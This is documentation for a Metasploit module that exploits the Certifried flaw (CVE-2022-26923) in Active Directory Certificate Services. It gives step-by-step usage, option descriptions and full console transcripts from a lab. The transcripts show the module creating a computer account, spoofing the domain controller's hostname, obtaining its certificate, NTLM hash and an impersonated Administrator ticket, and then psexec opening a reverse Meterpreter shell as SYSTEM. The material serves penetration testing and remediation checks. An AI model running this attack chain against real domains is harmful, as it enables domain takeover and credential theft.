## Vulnerable Application

This adds an auxiliary module that exploits a privilege escalation
vulnerability in Active Directory Certificate Services (ADCS) known as
Certifried (CVE-2022-26923) to generate a valid certificate impersonating the
Domain Controller (DC) computer account. This certificate is then used to
authenticate to the target as the DC account using PKINIT preauthentication
mechanism. The module will get and cache the Ticket-Granting-Ticket (TGT) for
this account along with its NTLM hash. Finally, it requests a TGS impersonating
a privileged user (Administrator by default). This TGS can then be used by
other modules or external tools.

The module will go through the following steps:
1. Check if the current user `ms-DS-MachineAccountQuota` let him add a computer account
1. Create a computer account
1. Change the new computer's `dNSHostName` attribute to match that of the DC
1. Request a certificate for this computer account and cache it
1. Authenticate to the remote host with the DC account's certificate and cache the TGT
1. Retrieve the DC account's NTLM hash
1. Escalate privileges by requesting a TGS impersonating a privileged domain user
1. Delete the computer account (only possible if the privilege escalation
   succeeded or if the current user is an administrator)

### Installing ADCS on a DC
(steps copied from https://github.com/rapid7/metasploit-framework/pull/16939)

- Open the Server Manager
- Select Add roles and features
- Select "Active Directory Certificate Services" under the "Server Roles" section
- When prompted add all of the features and management tools
- On the AD CS "Role Services" tab, leave the default selection of only "Certificate Authority"
- Complete the installation and reboot the server
- Reopen the Server Manager
- Go to the AD CS tab and where it says "Configuration Required", hit "More"
  then "Configure Active Directory Certificate..."
- Select "Certificate Authority" in the Role Services tab
- Keep all of the default settings, noting the value of the "Common name for
  this CA" on the "CA Name" tab (this value corresponds to the CA datastore
  option)
- Accept the rest of the default settings and complete the configuration
- Restart the server to ensure LDAPS on port 636 is running


## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use admin/dcerpc/cve_2022_26923_certifried`
1. Do: `run rhosts=<remote host> username=<username> password=<user password> domain=<FQDN domain name> dc_name=<DC hostname> ca=<CA Name>`
1. Verify the module executes all the steps listed above
1. Verify the certificate is retrieved and stored in the loot
1. Verify the authentication succeed and the TGT is retrieved
1. Verify the NT hash for the DC is also retrieved
1. Verify the impersonation worked and the resulting TGS is also retrieved

- Verify the privilege escalation is successful using `psexec` module. It will
  automatically use the TGS cached from the previous steps.

1. Do: `use windows/smb/psexec`
1. Do: `exploit rhosts=<remote host> lhost=<local host> smbuser=administrator smb::domain=<FQDN domain name> Smb::Auth=kerberos Smb::Rhostname=<DC hostname in FQDN format> DomainControllerRhost=<DC IP>`
1. Verify you got a session as the `NT AUTHORITY\SYSTEM` user

## Options

### DC_NAME

The name of the domain controller being targeted (must match RHOST)

### LDAP_PORT

The LDAP port. The default is 636 on an encrypted channel and 389 on a non-encrypted channel.

### CA
The target certificate authority. The default value used by AD CS is `$domain-DC-CA`.

### USERNAME

The username to authenticate with. This will be used for SMB, LDAP and Kerberos authentications.

### PASSWORD

The password to authenticate with. This will be used for SMB, LDAP and Kerberos authentications.

### COMPUTER_NAME

The computer name to add. A random name will be generated if not set.

### COMPUTER_PASSWORD

The password for the new computer. A random password will be generated if not set.

### SPN

The Service Principal Name used to request an additional impersonated TGS,
format is `<service_name>/<hostname>.<FQDN>` (e.g. `ldap/dc01.mydomain.local`).
Note that, independently of this option, a TGS for `cifs/<DC_NAME>.<DOMAIN>`
will always be requested. This option is only available if the `PRIVESC` action
is selected (default).

### IMPERSONATE

The user on whose behalf a TGS is requested (it will use S4U2Self/S4U2Proxy to
request the ticket). Set to `Administrator` by default. This option is only
available if the `PRIVESC` action is selected (default).

## ACTIONS

### REQUEST_CERT

Request a certificate with DNS host name matching the DC, which is stored
locally.

### AUTHENTICATE

Same as `REQUEST_CERT` but also authenticate as the DC account with Kerberos.
This TGT and the NT hash are retrieved.

### PRIVESC (default)

The full privilege escalation attack, which results in a TGS impersonating the
user set in the `IMPERSONATE` option (default is `Administrator`).

## Scenarios

### Windows Server 2019 Domain Controller with ADCS installed
```msf
msf6 auxiliary(admin/dcerpc/cve_2022_26923_certifried) > run verbose=true rhosts=192.168.100.104 username=Test password=123456 domain=mylab.local dc_name=DC02 ca=mylab-DC02-CA
[*] Running module against 192.168.100.104

[*] 192.168.100.104:445 - Requesting the ms-DS-MachineAccountQuota value to see if we can add any computer accounts...
[+] 192.168.100.104:445 - Successfully authenticated to LDAP (192.168.100.104:636)
[*] 192.168.100.104:445 - ms-DS-MachineAccountQuota = 10
[*] 192.168.100.104:445 - Connecting SMB with Test.mylab.local:123456
[*] 192.168.100.104:445 - Connecting to Security Account Manager (SAM) Remote Protocol
[*] 192.168.100.104:445 - Binding to \samr...
[+] 192.168.100.104:445 - Bound to \samr
[*] 192.168.100.104:445 - Using automatically identified domain: MYLAB
[+] 192.168.100.104:445 - Successfully created MYLAB\DESKTOP-E0SYYS6U$
[+] 192.168.100.104:445 -   Password: 4PuZlX57aULpEKXUZisjp227G0W0Rdvi
[+] 192.168.100.104:445 -   SID:      S-1-5-21-419547006-9459028-4093171872-12345
[*] 192.168.100.104:445 - Disconnecting SMB
[+] 192.168.100.104:445 - Successfully authenticated to LDAP (192.168.100.104:636)
[*] 192.168.100.104:445 - Retrieved original DNSHostame dc02.mylab.local for DC02
[*] 192.168.100.104:445 - Attempting to set the DNS hostname for the computer DESKTOP-E0SYYS6U$ to the DNS hostname for the DC: DC02
[*] 192.168.100.104:445 - Retrieved original DNSHostame dc02.mylab.local for DESKTOP-E0SYYS6U$
[+] 192.168.100.104:445 - Successfully changed the DNS hostname
[*] 192.168.100.104:445 - Connecting SMB with DESKTOP-E0SYYS6U$.mylab.local:4PuZlX57aULpEKXUZisjp227G0W0Rdvi
[*] 192.168.100.104:445 - Connecting to ICertPassage (ICPR) Remote Protocol
[*] 192.168.100.104:445 - Binding to \cert...
[+] 192.168.100.104:445 - Bound to \cert
[*] 192.168.100.104:445 - Requesting a certificate for user DESKTOP-E0SYYS6U$ - digest algorithm: SHA256 - template: Machine
[+] 192.168.100.104:445 - The requested certificate was issued.
[*] 192.168.100.104:445 - Certificate stored at: /home/msfuser/.msf4/loot/20230112165003_default_192.168.100.104_windows.ad.cs_852935.pfx
[*] 192.168.100.104:445 - Attempting PKINIT login for dc02$@mylab.local
[+] 192.168.100.104:445 - Successfully authenticated with certificate
[*] 192.168.100.104:445 - 192.168.100.104:445 - TGT MIT Credential Cache ticket saved to /home/msfuser/.msf4/loot/20230112165003_default_192.168.100.104_mit.kerberos.cca_654380.bin
[*] 192.168.100.104:445 - Trying to retrieve NT hash for dc02$
[+] 192.168.100.104:445 - 192.168.100.104:445 - Received a valid TGS-Response
[+] 192.168.100.104:445 - Found NTLM hash for dc02$: aad3b435b51404eeaad3b435b51404ee:a93d16873c9d49be9b1bce4359dcaa6d
[*] 192.168.100.104:445 - Getting TGS impersonating Administrator@mylab.local (SPN: cifs/DC02.mylab.local)
[+] 192.168.100.104:445 - 192.168.100.104:88 - Received a valid TGS-Response
[*] 192.168.100.104:445 - 192.168.100.104:445 - TGS MIT Credential Cache ticket saved to /home/msfuser/.msf4/loot/20230112165003_default_192.168.100.104_mit.kerberos.cca_985570.bin
[*] 192.168.100.104:445 - Disconnecting SMB
[*] 192.168.100.104:445 - Connecting SMB with Test.mylab.local:123456
[*] 192.168.100.104:445 - Connecting to Security Account Manager (SAM) Remote Protocol
[*] 192.168.100.104:445 - Binding to \samr...
[+] 192.168.100.104:445 - Bound to \samr
[*] 192.168.100.104:445 - Using automatically identified domain: MYLAB
[!] 192.168.100.104:445 - Unable to delete the computer account, this will have to be done manually with an Administrator account (Could not delete the computer DESKTOP-E0SYYS6U$: Error returned while deleting user in SAM server: (0xc0000022) STATUS_ACCESS_DENIED: {Access Denied} A process has requested access to an object but has not been granted those access rights.)
[*] 192.168.100.104:445 - Disconnecting SMB
[*] Auxiliary module execution completed
msf6 auxiliary(admin/dcerpc/cve_2022_26923_certifried) > creds
Credentials
===========

host             origin           service        public             private                                                            realm        private_type  JtR Format
----             ------           -------        ------             -------                                                            -----        ------------  ----------
192.168.100.104  192.168.100.104  445/tcp (smb)  DESKTOP-E0SYYS6U$  4PuZlX57aULpEKXUZisjp227G0W0Rdvi                                   MYLAB        Password
192.168.100.104  192.168.100.104  445/tcp (smb)  dc02$              aad3b435b51404eeaad3b435b51404ee:a93d16873c9d49be9b1bce4359dcaa6d  MYLAB.LOCAL  NTLM hash     nt,lm

msf6 auxiliary(admin/dcerpc/cve_2022_26923_certifried) > loot

Loot
====

host             service  type                 name             content                   info                                                                      path
----             -------  ----                 ----             -------                   ----                                                                      ----
192.168.100.104           windows.ad.cs        certificate.pfx  application/x-pkcs12      MYLAB\ Certificate                                                        /home/msfuser/.msf4/loot/20230112165003_default_192.168.100.104_windows.ad.cs_852935.pfx
192.168.100.104           mit.kerberos.ccache                   application/octet-stream  realm: MYLAB.LOCAL, client: dc02$, server: krbtgt/mylab.local             /home/msfuser/.msf4/loot/20230112165003_default_192.168.100.104_mit.kerberos.cca_654380.bin
192.168.100.104           mit.kerberos.ccache                   application/octet-stream  realm: MYLAB.LOCAL, client: administrator, server: cifs/dc02.mylab.local  /home/msfuser/.msf4/loot/20230112165003_default_192.168.100.104_mit.kerberos.cca_985570.bin
```

### Using `psexec` with the TGS impersonating the Administrator
```msf
msf6 exploit(windows/smb/psexec) > exploit rhosts=192.168.100.104 lhost=192.168.100.1 smbuser=administrator smbdomain=mylab.local Smb::Auth=kerberos Smb::Rhostname=dc02.mylab.local DomainControllerRhost=192.168.100.104


[*] Started reverse TCP handler on 192.168.100.1:4444
[*] 192.168.100.104:445 - Connecting to the server...
[*] 192.168.100.104:445 - Authenticating to 192.168.100.104:445|mylab.local as user 'administrator'...
[*] 192.168.100.104:445 - 192.168.100.104:88 - Using cached credential for cifs/DC02.mylab.local@MYLAB.LOCAL Administrator@MYLAB.LOCAL
[*] 192.168.100.104:445 - Selecting PowerShell target
[*] 192.168.100.104:445 - Executing the payload...
[+] 192.168.100.104:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 192.168.100.104
[*] Meterpreter session 1 opened (192.168.100.1:4444 -> 192.168.100.104:64442) at 2023-01-12 16:50:55 +0100

meterpreter > sysinfo
Computer        : DC02
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : MYLAB
Logged On Users : 8
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
